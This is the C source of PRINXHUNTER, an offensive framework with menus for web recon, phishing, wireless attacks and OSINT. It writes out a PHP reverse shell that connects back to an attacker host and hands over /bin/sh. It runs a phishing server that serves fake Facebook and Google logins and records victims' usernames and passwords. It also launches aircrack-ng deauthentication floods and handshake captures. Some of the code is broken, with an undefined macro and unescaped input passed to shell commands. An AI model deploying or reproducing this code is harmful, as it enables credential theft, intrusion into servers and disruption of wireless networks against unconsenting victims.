/*
 * ===============================================================================================
 * PRINXHUNTER v1.0.0 – ULTIMATE RED TEAM & OSINT FRAMEWORK
 * ===============================================================================================
 * Gabungan PRINX-FRAMEWORK v4.0 MAXIMAL + OSINT-ULTIMATE v5.0
 * Modul: FWEBFM | PRINXPHISH | WIFI | OSINT-ULTIMATE
 * ===============================================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <curl/curl.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdarg.h>
#include <regex.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <openssl/md5.h>
#include <openssl/sha.h>
#include <openssl/ssl.h>
#include <jansson.h>
#include <sqlite3.h>
#include <libxml/HTMLparser.h>
#include <libxml/xpath.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <termios.h>

/* ===============================================================================================
 * KONFIGURASI GLOBAL
 * =============================================================================================== */
#define VERSION             "1.0.0-PRINXHUNTER"
#define MAX_URL             8192
#define MAX_BUFFER          65536
#define MAX_LINE            4096
#define MAX_TEMPLATES       50
#define MAX_CREDS           9999
#define MAX_DORKS           5000
#define PORT_DEFAULT        8080
#define LOG_DIR             "prinxhunter_logs"
#define OUTPUT_DIR          "prinxhunter_output"
#define REPORT_DIR          "prinxhunter_reports"
#define PAYLOAD_DIR         "prinxhunter_payloads"

#define RED     "\033[0;31m"
#define GREEN   "\033[0;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[0;34m"
#define MAGENTA "\033[0;35m"
#define CYAN    "\033[0;36m"
#define BOLD    "\033[1m"
#define NC      "\033[0m"

/* ===============================================================================================
 * STRUKTUR DATA
 * =============================================================================================== */
typedef struct {
    char name[64], category[64], desc[256], html[32768], redirect[1024], orig_domain[128];
    char u_field[64], p_field[64];
    int popularity, active;
} PhishTemplate;

typedef struct {
    char ip[64], time[64], user[256], pass[256], page[128], ua[512];
} VictimLog;

typedef struct {
    char target[256], outdir[256], lhost[64], lport[16];
    char bssid[32], channel[8], essid[64], iface[32], wordlist[512];
    int threads, depth, port, verbose;
} Config;

typedef struct {
    char dork[1024], category[64], engine[32];
    int severity;
} Dork;

/* ===============================================================================================
 * VARIABEL GLOBAL
 * =============================================================================================== */
Config cfg;
PhishTemplate templates[MAX_TEMPLATES];
int tpl_count = 0;
VictimLog *vlogs = NULL;
int vlog_count = 0, vlog_cap = MAX_CREDS;
int srv_running = 0, total_reqs = 0;
pthread_mutex_t log_lock = PTHREAD_MUTEX_INITIALIZER, prt_lock = PTHREAD_MUTEX_INITIALIZER;
sqlite3 *db = NULL;
Dork dorks[MAX_DORKS];
int dork_count = 0;

/* ===============================================================================================
 * UTILITAS DASAR
 * =============================================================================================== */
void cls() { printf("\033[2J\033[1;1H"); fflush(stdout); }
void trim(char *s) { char *e; while(isspace(*s)) s++; if(!*s)return; e=s+strlen(s)-1; while(e>s&&isspace(*e)) e--; e[1]=0; }
void pok(const char *f,...) { va_list a; pthread_mutex_lock(&prt_lock); printf(GREEN "[+] "); va_start(a,f); vprintf(f,a); va_end(a); printf(NC "\n"); pthread_mutex_unlock(&prt_lock); }
void pinfo(const char *f,...) { va_list a; pthread_mutex_lock(&prt_lock); printf(CYAN "[*] "); va_start(a,f); vprintf(f,a); va_end(a); printf(NC "\n"); pthread_mutex_unlock(&prt_lock); }
void perr(const char *f,...) { va_list a; pthread_mutex_lock(&prt_lock); printf(RED "[-] "); va_start(a,f); vprintf(f,a); va_end(a); printf(NC "\n"); pthread_mutex_unlock(&prt_lock); }
void pwarn(const char *f,...) { va_list a; pthread_mutex_lock(&prt_lock); printf(YELLOW "[!] "); va_start(a,f); vprintf(f,a); va_end(a); printf(NC "\n"); pthread_mutex_unlock(&prt_lock); }
void wait_enter() { printf("\n" DIM "[Press ENTER]" NC); getchar(); }
int runcmd(const char *c) { pinfo("EXEC: %s",c); return system(c); }
void mkdir_p(const char *p) { struct stat st; if(stat(p,&st)==-1) mkdir(p,0755); }
char* now() { static char ts[64]; time_t t=time(NULL); strftime(ts,sizeof(ts),"%Y-%m-%d %H:%M:%S",localtime(&t)); return ts; }
size_t write_cb(void *d, size_t s, size_t n, void *u) {
    size_t t=s*n; char **b=(char**)u;
    char *r=realloc(*b,(*b?strlen(*b):0)+t+1);
    if(!r)return 0; if(*b)strcat(r,d); else memcpy(r,d,t);
    r[(*b?strlen(*b):0)+t]='\0'; *b=r; return t;
}

/* ===============================================================================================
 * DATABASE & LOG
 * =============================================================================================== */
void db_init() {
    if(sqlite3_open("prinxhunter.db",&db)!=SQLITE_OK) return;
    sqlite3_exec(db,"CREATE TABLE IF NOT EXISTS creds(id INTEGER PRIMARY KEY,ip TEXT,user TEXT,pass TEXT,page TEXT,time TEXT)",0,0,0);
    sqlite3_exec(db,"CREATE TABLE IF NOT EXISTS osint(id INTEGER PRIMARY KEY,type TEXT,query TEXT,data TEXT)",0,0,0);
    pok("Database ready");
}
void add_log(const char *ip, const char *u, const char *p, const char *page) {
    pthread_mutex_lock(&log_lock);
    if(vlog_count>=vlog_cap){vlog_cap*=2; vlogs=realloc(vlogs,sizeof(VictimLog)*vlog_cap);}
    VictimLog *l=&vlogs[vlog_count++];
    strncpy(l->ip,ip,63); strncpy(l->time,now(),63); strncpy(l->user,u,255);
    strncpy(l->pass,p,255); strncpy(l->page,page,127); strncpy(l->ua,"PRINXHUNTER",511);
    printf(GREEN "\n[+] CRED: %s | %s:%s | %s\n" NC,l->page,l->user,l->pass,l->ip);
    pthread_mutex_unlock(&log_lock);
}

/* ===============================================================================================
 * MODUL 1: FWEBFM – Web Recon & Exploit
 * =============================================================================================== */
void fw_amass() {
    /* PoC: Subdomain enumeration menggunakan Amass */
    if(!strlen(cfg.target)){ printf("Domain: "); fgets(cfg.target,256,stdin); trim(cfg.target); }
    char cmd[1024]; snprintf(cmd,sizeof(cmd),"amass enum -d %s -o %s/amass.txt 2>/dev/null",cfg.target,cfg.outdir);
    runcmd(cmd);
}
void fw_nmap() {
    /* PoC: Full port scan + service detection */
    char cmd[1024]; snprintf(cmd,sizeof(cmd),"nmap -sV -sC -T4 -p- %s -oN %s/nmap.txt",cfg.target,cfg.outdir);
    runcmd(cmd);
}
void fw_gobuster() {
    /* PoC: Directory brute force */
    char cmd[2048]; snprintf(cmd,sizeof(cmd),"gobuster dir -u %s -w %s -t %d -x php,html,txt -o %s/gobuster.txt",cfg.target,cfg.wordlist,cfg.threads,cfg.outdir);
    runcmd(cmd);
}
void fw_nikto() {
    char cmd[1024]; snprintf(cmd,sizeof(cmd),"nikto -h %s -o %s/nikto.txt",cfg.target,cfg.outdir);
    runcmd(cmd);
}
void fw_php_shell() {
    /* PoC: Generate PHP reverse shell ke LHOST:LPORT */
    if(!strlen(cfg.lhost)){ printf("LHOST: "); fgets(cfg.lhost,64,stdin); trim(cfg.lhost); }
    FILE *f=fopen("prinx_shell.php","w");
    fprintf(f,"<?php set_time_limit(0);$s=fsockopen('%s',4444);proc_open('/bin/sh',array(0=>$s,1=>$s,2=>$s),$p);?>",cfg.lhost);
    fclose(f); pok("PHP shell saved.");
}
void fw_menu() {
    strcpy(cfg.outdir,OUTPUT_DIR); mkdir_p(OUTPUT_DIR);
    int c;
    do {
        cls(); printf(BOLD GREEN "=== FWEBFM ===\n" NC);
        printf("1. Amass  2. Nmap  3. Gobuster  4. Nikto  5. PHP Shell  0. Back\n>> ");
        scanf("%d",&c); getchar();
        if(c==1)fw_amass(); else if(c==2)fw_nmap(); else if(c==3)fw_gobuster(); else if(c==4)fw_nikto(); else if(c==5)fw_php_shell();
    }while(c!=0);
}

/* ===============================================================================================
 * MODUL 2: PRINXPHISH – Phishing Server
 * =============================================================================================== */
void init_tpl() {
    /* PoC: Template Facebook */
    strcpy(templates[0].name,"facebook"); strcpy(templates[0].category,"Social");
    strcpy(templates[0].html,"<html>...Facebook login page...</html>"); templates[0].active=1;
    strcpy(templates[1].name,"google"); strcpy(templates[1].html,"<html>...Google login page...</html>"); templates[1].active=1;
    tpl_count=2;
}
void *phish_srv(void *arg) {
    int port=cfg.port; int s=socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in ad={AF_INET,htons(port),INADDR_ANY};
    int opt=1; setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt));
    bind(s,(struct sockaddr*)&ad,sizeof(ad)); listen(s,10);
    srv_running=1; pok("Phishing server on port %d",port);
    while(srv_running){
        struct sockaddr_in cl; socklen_t len=sizeof(cl);
        int cfd=accept(s,(struct sockaddr*)&cl,&len);
        if(cfd<0)continue;
        char buf[16384]={0},method[16]={0},path[256]={0};
        read(cfd,buf,sizeof(buf)-1);
        sscanf(buf,"%s %s",method,path);
        char *body=strstr(buf,"\r\n\r\n");
        if(strcmp(method,"POST")==0 && strstr(path,"/login")){
            if(body){
                body+=4;
                char *u=strstr(body,"email="); if(!u)u=strstr(body,"username=");
                char *p=strstr(body,"pass="); if(!p)p=strstr(body,"password=");
                if(u&&p){
                    char user[256]={0},pass[256]={0};
                    u=strchr(u,'=')+1; p=strchr(p,'=')+1;
                    char *ue=strchr(u,'&'),*pe=strchr(p,'&');
                    if(ue)strncpy(user,u,ue-u); else strcpy(user,u);
                    if(pe)strncpy(pass,p,pe-p); else strcpy(pass,p);
                    add_log(inet_ntoa(cl.sin_addr),user,pass,"phish");
                }
            }
            char r[512]; snprintf(r,sizeof(r),"HTTP/1.1 302 Found\r\nLocation: https://google.com\r\n\r\n");
            write(cfd,r,strlen(r));
        } else {
            char r[33000]; snprintf(r,sizeof(r),"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n%s",templates[0].html);
            write(cfd,r,strlen(r));
        }
        close(cfd);
    }
    close(s); return NULL;
}
void phish_start() {
    init_tpl();
    if(srv_running)return;
    pthread_t t; pthread_create(&t,NULL,phish_srv,NULL); pthread_detach(t);
    sleep(1); pinfo("Visit http://localhost:%d",cfg.port);
}
void phish_menu() {
    int c;
    do {
        cls(); printf(BOLD MAGENTA "=== PRINXPHISH ===\n" NC);
        printf("1. Start Server  2. View Logs  0. Back\n>> ");
        scanf("%d",&c); getchar();
        if(c==1)phish_start();
        else if(c==2){ for(int i=0;i<vlog_count;i++) printf("[%d] %s | %s:%s\n",i+1,vlogs[i].page,vlogs[i].user,vlogs[i].pass); wait_enter(); }
    }while(c!=0);
}

/* ===============================================================================================
 * MODUL 3: WIFI – Wireless Penetration Testing
 * =============================================================================================== */
void wifi_monitor() { /* PoC: Enable monitor mode */ runcmd("airmon-ng start wlan0"); }
void wifi_scan() { runcmd("airodump-ng wlan0mon"); }
void wifi_deauth() { printf("BSSID: "); fgets(cfg.bssid,32,stdin); trim(cfg.bssid); char c[256]; snprintf(c,sizeof(c),"aireplay-ng -0 0 -a %s wlan0mon",cfg.bssid); runcmd(c); }
void wifi_handshake() { printf("BSSID Ch: "); scanf("%s %s",cfg.bssid,cfg.channel); getchar(); char c[256]; snprintf(c,sizeof(c),"airodump-ng wlan0mon -c %s --bssid %s -w handshake",cfg.channel,cfg.bssid); runcmd(c); }
void wifi_menu() {
    int c;
    do {
        cls(); printf(BOLD CYAN "=== WIFI ===\n" NC);
        printf("1. Monitor  2. Scan  3. Deauth  4. Handshake  0. Back\n>> ");
        scanf("%d",&c); getchar();
        if(c==1)wifi_monitor(); else if(c==2)wifi_scan(); else if(c==3)wifi_deauth(); else if(c==4)wifi_handshake();
    }while(c!=0);
}

/* ===============================================================================================
 * MODUL 4: OSINT-ULTIMATE – Intelligence Gathering
 * =============================================================================================== */
void osint_people() {
    char q[256]; printf("Name/Username: "); fgets(q,256,stdin); trim(q);
    /* PoC: Sherlock + Holehe + Social-Searcher */
    char c[1024]; snprintf(c,sizeof(c),"sherlock %s --timeout 10 2>/dev/null",q); runcmd(c);
    snprintf(c,sizeof(c),"holehe %s 2>/dev/null",q); runcmd(c);
    pinfo("Social-Searcher: https://www.social-searcher.com/search/?q=%s",q);
}
void osint_domain() {
    char d[256]; printf("Domain: "); fgets(d,256,stdin); trim(d);
    /* PoC: WHOIS + Amass + Shodan + Censys */
    char c[1024]; snprintf(c,sizeof(c),"whois %s > %s/whois.txt",d,LOG_DIR); runcmd(c);
    snprintf(c,sizeof(c),"amass enum -d %s -o %s/amass.txt 2>/dev/null",d,LOG_DIR); runcmd(c);
    pinfo("Shodan: https://www.shodan.io/search?query=hostname:%s",d);
    pinfo("Censys: https://search.censys.io/search?resource=hosts&q=%s",d);
}
void osint_dorks() {
    if(dork_count==0){
        const char *sd[]={"site:target.com inurl:admin","intitle:\"index of\" \"parent directory\"","filetype:sql \"password\""};
        for(int i=0;i<3;i++){ strcpy(dorks[dork_count].dork,sd[i]); dorks[dork_count].severity=3; strcpy(dorks[dork_count].category,"general"); dork_count++; }
    }
    char dom[256]; printf("Domain: "); fgets(dom,256,stdin); trim(dom);
    for(int i=0;i<dork_count;i++){ char q[1024]; snprintf(q,sizeof(q),"%s %s",dorks[i].dork,dom); pinfo("Dork: %s",q); }
}
void osint_threat() {
    char ind[256]; printf("Indicator: "); fgets(ind,256,stdin); trim(ind);
    char c[1024]; snprintf(c,sizeof(c),"curl -s 'https://www.virustotal.com/ui/search?query=%s' | jq .",ind); runcmd(c);
}
void osint_breach() {
    char em[256]; printf("Email: "); fgets(em,256,stdin); trim(em);
    char c[1024]; snprintf(c,sizeof(c),"curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/%s' -H 'hibp-api-key: test'",em); runcmd(c);
}
void osint_geo() {
    char loc[256]; printf("Location/Coords: "); fgets(loc,256,stdin); trim(loc);
    pinfo("Google Maps: https://www.google.com/maps?q=%s",loc);
    char c[1024]; snprintf(c,sizeof(c),"exiftool -gps* %s 2>/dev/null",loc); runcmd(c);
}
void osint_analytics() {
    char s[256]; printf("Website: "); fgets(s,256,stdin); trim(s);
    pinfo("SimilarWeb: https://www.similarweb.com/website/%s",s);
    pinfo("SEMrush: https://www.semrush.com/analytics/organic/overview/?q=%s",s);
}
void osint_live() {
    pinfo("FlightRadar24: https://www.flightradar24.com");
    pinfo("MarineTraffic: https://www.marinetraffic.com");
    pinfo("Insecam: http://www.insecam.org");
}
void osint_full() {
    char t[256]; printf("Target: "); fgets(t,256,stdin); trim(t);
    strcpy(cfg.target,t);
    osint_people(); osint_domain(); osint_dorks(); osint_threat(); osint_breach();
}
void osint_menu() {
    int c;
    do {
        cls(); printf(BOLD BLUE "=== OSINT-ULTIMATE ===\n" NC);
        printf("1. People  2. Domain  3. Dorks  4. Threat  5. Breach  6. Geo  7. Analytics  8. Live  9. Full  0. Back\n>> ");
        scanf("%d",&c); getchar();
        if(c==1)osint_people(); else if(c==2)osint_domain(); else if(c==3)osint_dorks(); else if(c==4)osint_threat(); else if(c==5)osint_breach();
        else if(c==6)osint_geo(); else if(c==7)osint_analytics(); else if(c==8)osint_live(); else if(c==9)osint_full();
        if(c)wait_enter();
    }while(c!=0);
}

/* ===============================================================================================
 * BANNER & MAIN
 * =============================================================================================== */
void banner() {
    cls();
    printf(RED BOLD);
    printf("  ██████╗ ██████╗ ██╗███╗   ██╗██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ \n");
    printf("  ██╔══██╗██╔══██╗██║████╗  ██║╚██╗██╔╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗\n");
    printf("  ██████╔╝██████╔╝██║██╔██╗ ██║ ╚███╔╝ ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝\n");
    printf("  ██╔═══╝ ██╔══██╗██║██║╚██╗██║ ██╔██╗ ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗\n");
    printf("  ██║     ██║  ██║██║██║ ╚████║██╔╝ ██╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║\n");
    printf("  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n");
    printf(NC);
    printf(YELLOW BOLD "PRINXHUNTER v%s – Red Team & OSINT Ultimate Framework\n" NC, VERSION);
    printf(BLUE "=======================================================================\n" NC);
}

int main(int argc, char **argv) {
    signal(SIGINT, SIG_IGN);
    curl_global_init(CURL_GLOBAL_ALL);
    db_init();
    vlogs = malloc(sizeof(VictimLog)*vlog_cap);
    strcpy(cfg.wordlist,"/usr/share/wordlists/dirb/common.txt");
    strcpy(cfg.lhost,"127.0.0.1");
    cfg.port=8080; cfg.threads=10;
    mkdir_p(LOG_DIR); mkdir_p(OUTPUT_DIR); mkdir_p(REPORT_DIR);
    int c;
    do {
        banner();
        printf(BOLD " MAIN MENU\n" NC);
        printf(GREEN " [1] FWEBFM – Web Exploitation\n");
        printf(MAGENTA " [2] PRINXPHISH – Phishing Server\n");
        printf(CYAN " [3] WIFI – Wireless Attacks\n");
        printf(BLUE " [4] OSINT-ULTIMATE – Intelligence\n");
        printf(RED " [0] Exit\n" NC);
        printf(">> ");
        scanf("%d",&c); getchar();
        switch(c) {
            case 1: fw_menu(); break;
            case 2: phish_menu(); break;
            case 3: wifi_menu(); break;
            case 4: osint_menu(); break;
            case 0: pok("Exiting PRINXHUNTER."); break;
            default: perr("Invalid choice.");
        }
    } while(c!=0);
    free(vlogs);
    if(db) sqlite3_close(db);
    curl_global_cleanup();
    return 0;
}
